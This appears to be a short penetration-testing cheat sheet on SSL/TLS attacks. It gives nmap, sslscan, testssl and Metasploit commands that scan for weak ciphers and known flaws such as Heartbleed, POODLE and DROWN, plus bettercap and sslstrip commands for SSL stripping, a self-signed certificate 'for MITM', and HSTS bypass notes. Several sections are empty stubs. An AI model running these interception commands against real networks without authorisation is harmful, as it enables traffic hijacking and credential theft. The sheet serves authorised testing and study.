# SSL/TLS Certificate Attacks

## 1. SSL/TLS Enumeration
```bash
# nmap
nmap --script ssl-enum-ciphers -p 443 target
nmap --script ssl-cert -p 443 target
# testssl
testssl.sh target
# sslscan
sslscan target
```

## 2. Weak Cipher Suites
```bash
# Check for weak ciphers
sslscan --no-colour target | grep -i "weak\|null\|export\|rc4\|des"
nmap --script ssl-enum-ciphers -p 443 target | grep -i "weak\|grade"
```

## 3. SSL Stripping (MITM)
```bash
# Bettercap
bettercap -iface eth0 -caplet hstshijack/hstshijack
# sslstrip
sslstrip -l 8080
```

## 4. Certificate Forgery
```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# Use in MITM
```

## 5. Heartbleed (CVE-2014-0160)
```bash
# OpenSSL < 1.0.1g
nmap --script ssl-heartbleed -p 443 target
# Metasploit
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS target; run"
```

## 6. POODLE (CVE-2014-3566)
```bash
# SSLv3 downgrade
sslscan --no-fallback target
nmap --script ssl-poodle -p 443 target
```

## 7. BEAST (CVE-2011-3389)
```bash
# TLS 1.0 CBC cipher attack
```

## 8. CRIME (CVE-2012-4929)
```bash
# TLS compression attack
```

## 9. DROWN (CVE-2016-0800)
```bash
# SSLv2 attack
nmap --script ssl-drown -p 443 target
```

## 10. ROBOT Attack
```bash
# Bleichenbacher attack on RSA
python3 robot.py target
```

## 11. Certificate Transparency
```bash
# Enumerate subdomains via CT logs
curl -sk "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value'
```

## 12. HSTS Bypass
```bash
# First visit (before HSTS set)
# SSL stripping on first visit
# Subdomain bypass (if no includeSubDomains)
```

## Tools
```bash
# testssl.sh
# sslscan
# sslyze
# nmap ssl scripts
# Bettercap
# mitmproxy
```
